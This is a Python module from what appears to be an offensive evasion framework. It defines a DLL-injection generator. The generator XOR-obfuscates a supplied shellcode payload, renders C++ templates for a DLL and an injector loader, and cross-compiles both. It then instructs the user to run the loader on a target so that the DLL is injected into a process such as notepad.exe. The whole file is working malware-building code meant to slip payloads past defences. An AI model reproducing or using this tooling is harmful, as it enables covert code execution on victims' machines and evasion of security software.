import os
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.compiler import cross_compile_c, cross_compile_cpp
from utils.obfuscator import xor_encrypt
from utils.helpers import format_shellcode_to_hex, get_output_path
from config import TEMPLATE_DIRS

class DLLInjection(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="dll-injection",
            description="Generates a DLL containing shellcode and a loader executable to inject it into a target process by name.",
            options=[
                {'name': '--payload', 'type': 'str', 'required': True, 'help': 'Path to the raw shellcode file.'},
                {'name': '--output-dll', 'type': 'str', 'required': True, 'help': 'Name of the output DLL file (e.g., evil.dll).'},
                {'name': '--output-exe', 'type': 'str', 'required': True, 'help': 'Name of the output loader executable file (e.g., loader.exe).'},
                {'name': '--process-name', 'type': 'str', 'required': False, 'default': 'notepad.exe', 'help': 'Name of the target process to find and inject into (e.g., notepad.exe).'}
            ]
        )

    def generate(self, **kwargs):
        payload_path = kwargs['payload']
        dll_filename = kwargs['output_dll']
        loader_filename = kwargs['output_exe']
        target_process_name = kwargs['process_name']

        print(f"[*] Generating DLL ({dll_filename}) and Loader ({loader_filename}) for DLL Injection.")
        print(f"[*] Loader will target process: {target_process_name}")

        # 1. Read shellcode
        try:
            with open(payload_path, 'rb') as f:
                shellcode = f.read()
        except FileNotFoundError:
            print(f"[!] Error: Payload file '{payload_path}' not found.")
            return
        except Exception as e:
            print(f"[!] Error reading payload file '{payload_path}': {e}")
            return

        if not shellcode:
            print(f"[!] Error: Payload file '{payload_path}' is empty.")
            return

        # 2. Obfuscate shellcode for the DLL
        encrypted_shellcode, key = xor_encrypt(shellcode)
        hex_shellcode = format_shellcode_to_hex(encrypted_shellcode)
        print(f"[*] Shellcode for DLL obfuscated with XOR key: {key}")

        # 3. Render C++ template for the DLL
        env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)
        try:
            dll_template = env.get_template("dll_template.cpp") # Ensure this template exists
            dll_cpp_code = dll_template.render(
                shellcode_hex=hex_shellcode,
                xor_key=key
            )
        except Exception as e:
            print(f"[!] Error rendering DLL template (dll_template.cpp): {e}")
            return

        # 4. Compile the DLL
        temp_dir = "/tmp" # Consider making this configurable or using a more robust temp dir strategy
        if not os.path.exists(temp_dir):
            try:
                os.makedirs(temp_dir)
            except OSError as e:
                print(f"[!] Error creating temporary directory {temp_dir}: {e}. Using current directory.")
                temp_dir = "."

        temp_dll_source_path = os.path.join(temp_dir, f"{dll_filename}.cpp")

        try:
            with open(temp_dll_source_path, 'w') as f:
                f.write(dll_cpp_code)
        except Exception as e:
            print(f"[!] Error writing temporary DLL source file '{temp_dll_source_path}': {e}")
            return
        
        dll_output_path = get_output_path(dll_filename)
        
        print(f"[*] Compiling DLL: {dll_filename}...")
        # DLLs are often C, but template is .cpp. cross_compile_c handles .dll extension for -shared.
        # If dll_template.cpp is truly C++, use cross_compile_cpp with a flag for shared library if needed.
        # For now, assuming dll_template.cpp can be compiled as C or C++ with flags set by compiler.py.
        # The `cross_compile_c` function in `compiler.py` automatically adds `-shared` if the output ends with `.dll`.
        # If your `dll_template.cpp` uses C++ specific features, you might need `cross_compile_cpp` and ensure `-shared` is passed.
        # Let's use cross_compile_c which is designed to add -shared for DLLs.
        if not cross_compile_c(temp_dll_source_path, dll_output_path):
            print(f"[!] DLL ({dll_filename}) compilation failed. Check compiler output. Temp source: {temp_dll_source_path}")
            # os.remove(temp_dll_source_path) # Optionally keep for debugging
            return
        # print(f"[+] DLL compiled successfully: {dll_output_path}") # This is printed by compiler.py

        try:
            if os.path.exists(temp_dll_source_path):
                os.remove(temp_dll_source_path)
        except Exception as e:
            print(f"[!] Warning: Failed to remove temporary DLL source file '{temp_dll_source_path}': {e}")


        # 5. Render C++ template for the Loader EXE
        try:
            loader_template = env.get_template("dll_injection_loader.cpp") # Ensure this template exists
            # The loader needs to know the name of the DLL to load.
            # It will assume the DLL is in a path discoverable by LoadLibrary (e.g., same dir, system path).
            # For simplicity, the loader will use the DLL filename directly.
            loader_cpp_code = loader_template.render(
                dll_name_str=dll_filename,  # Pass the DLL filename
                target_process_name_str=target_process_name.replace('\\', '\\\\') # Escape for C++ string
            )
        except Exception as e:
            print(f"[!] Error rendering Loader template (dll_injection_loader.cpp): {e}")
            return

        # 6. Compile the Loader EXE
        temp_loader_source_path = os.path.join(temp_dir, f"{loader_filename}.cpp")
        try:
            with open(temp_loader_source_path, 'w') as f:
                f.write(loader_cpp_code)
        except Exception as e:
            print(f"[!] Error writing temporary Loader source file '{temp_loader_source_path}': {e}")
            return
        
        loader_output_path = get_output_path(loader_filename)
        print(f"[*] Compiling Loader EXE: {loader_filename}...")
        if not cross_compile_cpp(temp_loader_source_path, loader_output_path):
            print(f"[!] Loader EXE ({loader_filename}) compilation failed. Check compiler output. Temp source: {temp_loader_source_path}")
            # os.remove(temp_loader_source_path) # Optionally keep for debugging
        # else:
            # print(f"[+] Loader EXE compiled successfully: {loader_output_path}") # Printed by compiler.py
        
        try:
            if os.path.exists(temp_loader_source_path):
                os.remove(temp_loader_source_path)
        except Exception as e:
            print(f"[!] Warning: Failed to remove temporary Loader source file '{temp_loader_source_path}': {e}")

        if os.path.exists(dll_output_path) and os.path.exists(loader_output_path):
            print(f"[+] DLL Injection artifacts generated successfully!")
            print(f"    DLL: {dll_output_path}")
            print(f"    Loader: {loader_output_path}")
            print(f"    Run '{loader_filename}' on the target. It will attempt to inject '{dll_filename}' into '{target_process_name}'.")
        else:
            print(f"[!] DLL Injection artifact generation encountered issues. Check logs.")